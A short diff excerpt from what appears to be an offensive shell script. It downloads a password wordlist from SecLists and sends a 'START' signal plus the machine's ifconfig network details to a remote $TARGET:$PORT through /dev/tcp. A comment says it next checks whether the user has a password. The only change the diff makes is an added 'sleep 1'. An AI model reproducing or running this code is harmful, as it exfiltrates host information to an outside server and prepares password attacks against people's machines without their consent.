@@ -6,6 +6,7 @@ wget -O ~/Downloads/p https://github.com/danielmiessler/SecLists/raw/master/Pass
 
 # Tell server a process has started with host information
 echo "START" > /dev/tcp/"$TARGET"/"$PORT"
+sleep 1
 ifconfig | grep "net" > /dev/tcp/"$TARGET"/"$PORT"
 
 # Check if user uses password or not
